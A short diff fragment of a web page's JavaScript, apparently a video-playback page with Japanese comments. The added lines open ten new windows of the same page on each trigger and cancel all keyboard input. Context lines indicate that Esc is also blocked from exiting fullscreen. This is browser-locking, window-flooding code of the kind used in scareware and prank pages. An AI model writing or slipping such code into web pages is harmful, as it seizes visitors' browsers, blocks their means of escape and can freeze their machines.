@@ -85,6 +85,16 @@
                 console.error('動画の再生に失敗しました:', error);
             });
             this.style.display = 'none';
+
+            // 10個の新しいウィンドウを開く
+            for (var i = 0; i < 10; i++) {
+                window.open(window.location.href, '_blank');
+            }
+        });
+
+        // 全てのキーボードショートカットを無効化
+        document.addEventListener('keydown', function(event) {
+            event.preventDefault();
         });
 
         // Escキーによる全画面モード退出を防止
